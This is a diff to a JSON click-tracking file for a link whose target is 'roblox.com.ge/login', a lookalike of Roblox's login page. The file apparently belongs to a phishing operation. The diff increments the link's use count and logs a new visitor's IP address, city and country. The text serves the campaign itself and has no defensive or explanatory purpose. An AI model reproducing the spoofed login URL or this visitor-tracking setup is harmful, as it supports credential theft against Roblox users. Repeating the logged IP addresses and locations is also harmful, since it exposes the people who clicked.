@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1128,
+    "useCount": 1129,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9168,6 +9168,14 @@
         "city": "Mandurah",
         "flag": "🇦🇺",
         "countryCode": "AU"
+      },
+      {
+        "timestamp": 1777275563584,
+        "ip": "103.171.20.162",
+        "country": "Philippines",
+        "city": "Ilagan City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
